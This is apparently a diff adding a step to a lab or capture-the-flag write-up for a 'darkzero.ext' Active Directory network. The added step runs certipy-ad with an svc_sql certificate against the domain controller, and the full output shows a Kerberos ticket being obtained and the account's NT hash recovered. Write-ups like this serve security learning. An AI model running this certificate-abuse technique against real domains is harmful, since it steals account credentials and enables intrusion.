@@ -631,5 +631,41 @@ PING 172.16.20.2 (172.16.20.2) 56(84) bytes of data.
 
 I can now ping `dc02`
 
+# Getting NTLM hash for `sql_svc` from dc02
 
+So first ill copy the pfx given from certify and put it in a file 
+
+```python
+
+```
+
+```python
+certipy-ad auth -pfx svc_sql.pfx -dc-ip 172.16.20.2 -username svc_sql -domain darkzero.ext -debug
+Certipy v5.1.0 - by Oliver Lyak (ly4k)
+
+[+] Target name (-target) and DC host (-dc-host) not specified. Using domain '' as target name. This might fail for cross-realm operations
+[+] Nameserver: '172.16.20.2'
+[+] DC IP: '172.16.20.2'
+[+] DC Host: ''
+[+] Target IP: '172.16.20.2'
+[+] Remote Name: '172.16.20.2'
+[+] Domain: ''
+[+] Username: 'SVC_SQL'
+/usr/lib/python3/dist-packages/certipy/lib/certificate.py:662: UserWarning: PKCS#12 bundle could not be parsed as DER, falling back to parsing as BER. Please file an issue at https://github.com/pyca/cryptography/issues explaining how your PKCS#12 bundle was created. In the future, this may become an exception. Error details: ASN.1 parsing error: invalid length
+  return pkcs12.load_key_and_certificates(pfx, password)[:-1]
+[*] Certificate identities:
+[*]     SAN UPN: 'svc_sql@darkzero.ext'
+[*]     Security Extension SID: 'S-1-5-21-1969715525-31638512-2552845157-1103'
+[+] Found SID in security extension: 'S-1-5-21-1969715525-31638512-2552845157-1103'
+[*] Using principal: 'svc_sql@darkzero.ext'
+[*] Trying to get TGT...
+[+] Sending AS-REQ to KDC darkzero.ext (172.16.20.2)
+[*] Got TGT
+[*] Saving credential cache to 'svc_sql.ccache'
+[+] Attempting to write data to 'svc_sql.ccache'
+[+] Data written to 'svc_sql.ccache'
+[*] Wrote credential cache to 'svc_sql.ccache'
+[*] Trying to retrieve NT hash for 'svc_sql'
+[*] Got hash for 'svc_sql@darkzero.ext': aad3b435b51404eeaad3b435b51404ee:816ccb849956b531db139346751db65f
+```
 
